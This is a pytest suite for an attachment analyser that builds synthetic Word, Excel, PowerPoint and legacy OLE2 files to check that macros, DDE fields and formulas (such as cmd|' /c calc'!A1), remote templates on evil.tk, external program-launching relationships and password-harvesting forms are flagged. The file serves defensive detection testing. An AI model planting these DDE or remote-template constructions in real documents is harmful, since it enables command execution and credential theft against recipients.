"""Bypasses through Office documents: OOXML packages, field codes, DDE,
relationships, embedded objects and legacy OLE2 files."""

from __future__ import annotations

import base64
import io
import struct
import warnings
import zipfile

import pytest

import archive_analysis as arch
import attachment_analysis as aa
import office_analysis as oa


def _docx(parts: dict[str, str]) -> bytes:

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    return buf.getvalue()


_W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'


_RELS = '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{}</Relationships>'


_DOC = f"<w:document {_W}><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>"


def _office_flags(parts, filename="invoice.docm"):
    out = aa.analyse_attachment(base64.b64encode(_docx(parts)).decode(), filename=filename)
    return out


def _fields(*runs):
    body = "".join(
        f'<w:r><w:fldChar w:fldCharType="{r[1:]}"/></w:r>'
        if r.startswith("|")
        else f"<w:r><w:t>{r[1:]}</w:t></w:r>"
        if r.startswith("=")
        else f"<w:r><w:instrText>{r}</w:instrText></w:r>"
        for r in runs
    )
    return f"<w:document {_W}><w:body><w:p>{body}</w:p></w:body></w:document>".encode()


def _cfb(streams: list[str]) -> bytes:
    """A minimal OLE2 compound file (512-byte sectors): a header, one FAT
    sector and one directory sector naming `streams` (at most 3)."""

    header = bytearray(b"\xff" * 512)
    header[:76] = (
        oa.OLE2_MAGIC
        + b"\x00" * 16
        + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6)
        + b"\x00" * 10
        + struct.pack("<IIIIIIII", 1, 1, 0, 4096, 0xFFFFFFFE, 0, 0xFFFFFFFE, 0)
    )
    header[76:80] = struct.pack("<I", 0)
    fat = struct.pack("<II", 0xFFFFFFFD, 0xFFFFFFFE) + b"\xff" * 504

    def entry(name: str, kind: int) -> bytes:
        raw = name.encode("utf-16-le") + b"\x00\x00"
        return raw.ljust(64, b"\x00") + struct.pack("<HB", len(raw), kind) + b"\x00" * 61

    directory = entry("Root Entry", 5) + b"".join(entry(n, 2) for n in streams)
    return bytes(header) + fat + directory.ljust(512, b"\x00")


def test_office_parts_are_read_whatever_their_case():
    raw = _docx(
        {
            "[Content_Types].xml": "",
            "word/Document.xml": f"<w:document {_W}><w:body><w:p><w:r><w:t>Verify your account</w:t></w:r></w:p></w:body></w:document>",
            "word/_rels/Document.xml.RELS": '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="r1" Type="http://x/attachedTemplate" Target="https://evil.tk/t.dotm" TargetMode="External"/></Relationships>',
        }
    )
    out = aa.analyse_attachment(base64.b64encode(raw).decode(), filename="invoice.docx")
    assert "Verify your account" in out["extracted_text"]
    assert "remote_template" in out["notable_features"]


def test_field_codes_split_over_runs_are_joined():
    xml = (
        f"<w:document {_W}><w:body><w:p>"
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        "<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>EAUTO cmd.exe</w:instrText></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText>HYPERLINK "https://evil.</w:instrText></w:r><w:r><w:instrText>tk/login"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        "</w:p></w:body></w:document>"
    ).encode()
    codes = oa._field_codes(xml)
    assert "DDEAUTO cmd.exe" in codes
    assert 'HYPERLINK "https://evil.tk/login"' in codes


@pytest.mark.parametrize(
    ("parts", "filename", "flag"),
    [
        (
            {
                "[Content_Types].xml": "",
                "word/x": "",
                "login.html": "<form><input type=password></form>",
            },
            "invoice.docx",
            "contains_password_field",
        ),
        ({"invoice.pdf.exe": "MZ"}, "invoice.docx", "executable_in_archive"),
        (
            {"[Content_Types].xml": "", "word/document.xml": "<x/>", "run.js": "x"},
            "report",
            "script_in_archive",
        ),
    ],
)
def test_zip_read_by_content_not_name(parts, filename, flag):
    out = aa.analyse_attachment(base64.b64encode(_docx(parts)).decode(), filename=filename)
    assert flag in out["notable_features"]


@pytest.mark.parametrize(
    ("extra", "filename"),
    [
        ({"x": ""}, "invoice.docm"),
        ({"customUI/customUI.xml": "<x/>"}, "invoice.docm"),
        ({"_xmlsignatures/sig1.xml": "<x/>"}, "invoice.docm"),
        ({"notes.txt": "hello"}, "invoice.docm"),
        ({}, "invoice.zip"),
        ({"readme.html": "<p>hi</p>"}, "invoice.zip"),
    ],
)
def test_macro_document_stays_document_with_extras(extra, filename):
    out = _office_flags(
        {"[Content_Types].xml": "", "word/document.xml": _DOC, "word/vbaProject.bin": "x", **extra},
        filename,
    )
    assert "contains_macros" in out["notable_features"]


def test_a_page_inside_an_office_folder_is_read():
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/login.html": "<form action='https://evil.tk/p'><input type=password></form>",
        },
        "invoice.docx",
    )
    assert "contains_password_field" in out["notable_features"]
    assert "https://evil.tk/p" in out["extracted_urls"]
    assert any(f["filename"] == "word/login.html" for f in out["inner_files"])


def test_backslash_part_names_are_office_parts():
    out = _office_flags(
        {"[Content_Types].xml": "", "word\\document.xml": _DOC, "word\\vbaProject.bin": "x"},
        "invoice.docx",
    )
    assert out["kind"] == "docx"
    assert "contains_macros" in out["notable_features"]


@pytest.mark.parametrize(
    "xml",
    [
        # An empty field nested in the instruction.
        _fields("|begin", "DD", "|begin", "|end", "EAUTO c:\\x", "|end"),
        # A nested field whose result writes the rest of the word.
        _fields(
            "|begin", "DD", "|begin", 'QUOTE "x"', "|separate", "=EAUTO", "|end", " c:\\x", "|end"
        ),
        # A field never closed.
        _fields("|begin", "DDE", "AUTO c:\\x"),
    ],
)
def test_dde_fields_are_read_as_word_builds_them(xml):
    assert oa._DDE_FIELD_RE.search(oa._field_codes(xml))


@pytest.mark.parametrize(
    "instr",
    [
        'HYPERLINK \\o "Click here" "https://evil.tk/a"',
        "HYPERLINK https://evil.tk/a",
        'HYPERLINK \\l "x" "https://evil.tk/a"',
        'INCLUDEPICTURE "https://evil.tk/a" \\d',
    ],
)
def test_link_fields_give_their_address(instr):
    urls: list[str] = []
    oa._field_urls(instr, urls)
    assert "https://evil.tk/a" in urls


@pytest.mark.parametrize(
    ("rel", "flag"),
    [
        (
            'Type="http://x/attachedTemplate" Target="//evil.tk/t.dotm" TargetMode="External"',
            "remote_template",
        ),
        (
            'Type="http://x/AttachedTemplate" Target="https://evil.tk/t.dotm" TargetMode="external"',
            "remote_template",
        ),
        (
            'Type="http://x/frame" Target="https://evil.tk/f.html" TargetMode="External"',
            "remote_template",
        ),
        (
            'Type="http://x/subDocument" Target="https://evil.tk/s.docx" TargetMode="External"',
            "remote_template",
        ),
        (
            'Type="http://x/oleObject" Target="mhtml:https://evil.tk/x!x-usc:https://evil.tk/y" TargetMode="External"',
            "launch_external_action",
        ),
        (
            'Type="http://x/hyperlink" Target="\\\\evil.tk\\share\\a.lnk" TargetMode="External"',
            "launch_external_action",
        ),
        (
            'Type="http://x/hyperlink" Target="file:///c:/windows/system32/calc.exe" TargetMode="External"',
            "launch_external_action",
        ),
        (
            'Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="macros.dat"',
            "contains_macros",
        ),
    ],
)
def test_relationships_that_make_office_act(rel, flag):
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/_rels/settings.xml.rels": _RELS.format(f'<Relationship Id="r1" {rel}/>'),
        },
        "invoice.docx",
    )
    assert flag in out["notable_features"]


def test_content_types_name_a_renamed_macro_project():
    types = "<Types><Override PartName='/word/m.dat' ContentType='application/vnd.ms-office.vbaProject'/></Types>"
    out = _office_flags(
        {"[Content_Types].xml": types, "word/document.xml": _DOC, "word/m.dat": "x"}
    )
    assert "contains_macros" in out["notable_features"]


def test_excel_dde_formulas_and_powerpoint_run_actions():
    sheet = (
        "<worksheet><sheetData><row><c><f>cmd|' /c calc'!A1</f></c></row></sheetData></worksheet>"
    )
    xl = {
        "[Content_Types].xml": "",
        "xl/workbook.xml": "<workbook/>",
        "xl/worksheets/sheet1.xml": sheet,
    }
    assert "dde_field" in _office_flags(xl, "a.xlsx")["notable_features"]
    slide = '<p:sld xmlns:p="p" xmlns:a="a"><a:hlinkClick action="ppaction://program"/></p:sld>'
    pp = {"[Content_Types].xml": "", "ppt/presentation.xml": "<p/>", "ppt/slides/slide1.xml": slide}
    assert "launch_external_action" in _office_flags(pp, "a.pptx")["notable_features"]


def test_dde_field_after_text_limit_found():
    long_text = (
        f"<w:document {_W}><w:body>"
        + "<w:p><w:r><w:t>word </w:t></w:r></w:p>" * 6000
        + "</w:body></w:document>"
    )
    dde = _fields("|begin", "DDEAUTO c:\\x", "|end").decode()
    out = _office_flags(
        {"[Content_Types].xml": "", "word/document.xml": long_text, "word/footer1.xml": dde},
        "a.docx",
    )
    assert "dde_field" in out["notable_features"]


def test_archive_members_ordered_and_all_named():
    parts = {f"{i}.png": "x" for i in range(6)} | {
        "login.html": "<form><input type=password></form>"
    }
    out = _office_flags(parts, "photos.zip")
    assert "contains_password_field" in out["notable_features"]
    many = {f"{i:02}.txt": "x" for i in range(60)} | {"zz.exe": "MZ"}
    out = _office_flags(many, "notes.zip")
    assert "zz.exe" in out["_all_entries"]
    assert arch.entry_reasons("zz.exe") == ["program"]


@pytest.mark.parametrize(
    "target",
    ["https://www.example.com", "https://intranet.example.com/index.html", "mailto:a@example.com"],
)
def test_ordinary_document_links_are_not_programs(target):
    rel = (
        f'<Relationship Id="r1" Type="http://x/hyperlink" Target="{target}" TargetMode="External"/>'
    )
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/_rels/document.xml.rels": _RELS.format(rel),
        },
        "report.docx",
    )
    assert out["notable_features"] == []


def test_program_in_embedded_object_flagged():
    ole = _cfb(["\x01Ole10Native"]) + b"\x02\x00invoice.pdf.js\x00C:\\Users\\a\\invoice.pdf.js\x00"
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/embeddings/oleObject1.bin": ole,
        },
        "a.docx",
    )
    assert "script_in_archive" in out["notable_features"]


def test_two_parts_of_the_same_name_are_both_read():
    dde = f'<w:document {_W}><w:body><w:p><w:fldSimple w:instr="DDEAUTO c:\\\\x"/></w:p></w:body></w:document>'
    for order in ((dde, _DOC), (_DOC, dde)):
        buf = io.BytesIO()
        with warnings.catch_warnings(), zipfile.ZipFile(buf, "w") as zf:
            warnings.simplefilter("ignore")
            zf.writestr("[Content_Types].xml", "")
            for part in order:
                zf.writestr("word/document.xml", part)
        assert "dde_field" in aa.dispatch_raw(buf.getvalue(), "a.docx")["notable_features"]


def test_legacy_dde_fields_in_any_case():
    raw = oa.OLE2_MAGIC + b"\x00" * 64 + b"\x13 ddeauto c:\\\\windows\\\\cmd.exe \x14\x15"
    assert "dde_field" in oa.analyse_ole(raw, "a.doc")["notable_features"]


def test_slow_document_not_reported_clean(monkeypatch):
    monkeypatch.setattr(oa, "_READ_SECONDS", -1.0)
    out = _office_flags({"[Content_Types].xml": "", "word/document.xml": _DOC}, "a.docx")
    assert "document_not_fully_read" in out["notable_features"]


@pytest.mark.parametrize(
    ("streams", "flag"),
    [
        (["_vba_project"], "contains_macros"),
        (["MACROS"], "contains_macros"),
        (["\x01OLE10NATIVE"], "embedded_ole_object"),
        (["objectpool"], "embedded_ole_object"),
        (["encryptedpackage"], "encrypted_document"),
    ],
)
def test_ole_directory_names_in_any_case(streams, flag):
    assert flag in oa.analyse_ole(_cfb(streams), "a.doc")["notable_features"]


def test_legacy_document_about_macros_not_macro():
    raw = _cfb(["WordDocument"]) + "Enable Macros in Excel".encode("utf-16-le")
    assert "contains_macros" not in oa.analyse_ole(raw, "a.doc")["notable_features"]


def test_an_ole_part_under_any_name_is_read():
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/pkg.dat": _cfb(["_VBA_PROJECT"]),
        },
        "a.docx",
    )
    assert "contains_macros" in out["notable_features"]


def test_parts_outside_the_text_are_read_for_addresses():
    shared = struct.pack("<I", 0) + "Pay at https://evil.tk/xlsb now".encode("utf-16-le")
    xlsb = _office_flags(
        {"[Content_Types].xml": "", "xl/workbook.bin": "x", "xl/sharedStrings.bin": shared},
        "book.xlsb",
    )
    assert "https://evil.tk/xlsb" in xlsb["extracted_urls"]
    vml = '<xml><v:shape href="https://evil.tk/vml"/></xml>'
    props = "<Properties><Company>https://evil.tk/props</Company></Properties>"
    svg = '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://evil.tk/svg"><text>Go</text></a></svg>'
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/vmlDrawing1.vml": vml,
            "docProps/app.xml": props,
            "word/media/image1.svg": svg,
        },
        "a.docx",
    )
    assert {"https://evil.tk/vml", "https://evil.tk/props", "https://evil.tk/svg"} <= set(
        out["extracted_urls"]
    )


def test_an_internal_package_relationship_is_an_object():
    rel = '<Relationship Id="r1" Type="http://x/package" Target="embeddings/x.docx"/>'
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/_rels/document.xml.rels": _RELS.format(rel),
        },
        "a.docx",
    )
    assert "embedded_ole_object" in out["notable_features"]


def test_a_page_after_many_office_parts_is_read():
    parts = {"[Content_Types].xml": "", "word/document.xml": _DOC}
    parts |= {f"word/media/i{i}.png": "x" for i in range(600)}
    parts["login.html"] = "<form><input type=password></form>"
    out = _office_flags(parts, "a.docx")
    assert "contains_password_field" in out["notable_features"]
    assert out["entries"] == ["login.html"]


def test_what_office_adds_is_read_not_listed():
    svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>'
    parts = {
        "[Content_Types].xml": "",
        "word/document.xml": _DOC,
        "word/media/image1.svg": svg,
        "word/embeddings/Microsoft_Excel_Worksheet1.xlsx": "not really a workbook",
    }
    out = _office_flags(parts, "report.docx")
    assert out["notable_features"] == []
    assert not out.get("entries")
    inside = _office_flags({"report.docx": _docx(parts)}, "files.zip")
    assert "inner_files_not_extracted" not in inside["notable_features"]


@pytest.mark.parametrize(
    "formulas",
    [
        ['A1&"|"', "Sheet2!B1"],
        ["SUM(A1:A3)", 'CONCAT("a|b", "!")'],
    ],
)
def test_ordinary_formulas_are_not_dde(formulas):
    cells = "".join(f"<c><f>{f}</f></c>" for f in formulas)
    sheet = f"<worksheet><sheetData><row>{cells}</row></sheetData></worksheet>"
    xl = {
        "[Content_Types].xml": "",
        "xl/workbook.xml": "<workbook/>",
        "xl/worksheets/sheet1.xml": sheet,
    }
    assert "dde_field" not in _office_flags(xl, "a.xlsx")["notable_features"]


@pytest.mark.parametrize(
    "formula", ["cmd|' /c calc'!A1", "IF(1,cmd|'/c calc'!A0)", "=MSEXCEL|'\\..\\cmd.exe'!A1"]
)
def test_dde_formulas_are_found(formula):
    sheet = f"<worksheet><sheetData><row><c><f>{formula}</f></c></row></sheetData></worksheet>"
    xl = {
        "[Content_Types].xml": "",
        "xl/workbook.xml": "<workbook/>",
        "xl/worksheets/sheet1.xml": sheet,
    }
    assert "dde_field" in _office_flags(xl, "a.xlsx")["notable_features"]


def test_binary_strings_end_at_nul():
    raw = _cfb(["WordDocument"]) + "https://evil.tk\x00Click here\x00".encode("utf-16-le")
    raw += b"http://evil2.tk/a\x00More"
    urls = oa.analyse_ole(raw, "a.doc")["extracted_urls"]
    assert {"https://evil.tk", "http://evil2.tk/a"} <= set(urls)
    assert not any("click" in u.lower() or "more" in u.lower() for u in urls)


def test_ole_names_end_at_nul_empty_dir_fallback():
    raw = bytearray(_cfb(["_VBA_PROJECT"]))
    # The name length claims one more character, a NUL.
    raw[1024 + 128 + 64 : 1024 + 128 + 66] = struct.pack("<H", 28)
    assert "contains_macros" in oa.analyse_ole(bytes(raw), "a.doc")["notable_features"]
    raw = bytearray(_cfb([]))
    raw[48:52] = struct.pack("<I", 0xFFFFFFFE)
    raw += "_VBA_PROJECT".encode("utf-16-le")
    assert "contains_macros" in oa.analyse_ole(bytes(raw), "a.doc")["notable_features"]


def test_an_ole_file_under_a_picture_name_is_read():
    out = _office_flags(
        {
            "[Content_Types].xml": "",
            "word/document.xml": _DOC,
            "word/media/image9.png": _cfb(["_VBA_PROJECT"]),
        },
        "a.docx",
    )
    assert "contains_macros" in out["notable_features"]


@pytest.mark.parametrize(
    ("formula", "dde"),
    [
        ('IF(A1="x a|b!c", 1, 0)', False),
        ('REGEXEXTRACT(A1, "^ a|b!c")', False),
        ("cmd|'/c calc'!'A1'", True),
        ("IF(1, cmd|'/c calc'!A0)", True),
    ],
)
def test_dde_formulas_and_strings(formula, dde):
    sheet = f"<worksheet><sheetData><row><c><f>{formula}</f></c></row></sheetData></worksheet>"
    xl = {
        "[Content_Types].xml": "",
        "xl/workbook.xml": "<workbook/>",
        "xl/worksheets/sheet1.xml": sheet,
    }
    assert ("dde_field" in _office_flags(xl, "a.xlsx")["notable_features"]) is dde


def test_xlsb_cell_text_is_not_a_formula():
    shared = struct.pack("<I", 0) + "Status | Alert!Check DDEAUTO".encode("utf-16-le")
    xlsb = {"[Content_Types].xml": "", "xl/workbook.bin": "x", "xl/sharedStrings.bin": shared}
    assert "dde_field" not in _office_flags(xlsb, "book.xlsb")["notable_features"]


def test_office_pictures_do_not_displace_page():
    svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>'
    parts = {"[Content_Types].xml": "", "word/document.xml": _DOC}
    parts |= {f"word/media/i{i}.svg": svg for i in range(6)}
    parts["word/login.html"] = "<form><input type=password></form>"
    out = _office_flags(parts, "a.docx")
    assert "contains_password_field" in out["notable_features"]
    assert [f["filename"] for f in out["inner_files"]] == ["word/login.html"]


def test_svg_in_archived_document_gives_links():
    svg = '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://evil.tk/svg"><rect/></a></svg>'
    doc = _docx({"[Content_Types].xml": "", "word/document.xml": _DOC, "word/media/x.svg": svg})
    out = _office_flags({"report.docx": doc}, "files.zip")
    assert "https://evil.tk/svg" in out["extracted_urls"]


def test_embedded_macro_workbook_listed():
    parts = {"[Content_Types].xml": "", "word/document.xml": _DOC, "word/embeddings/x.xlsm": "x"}
    assert _office_flags(parts, "a.docx")["entries"] == ["word/embeddings/x.xlsm"]
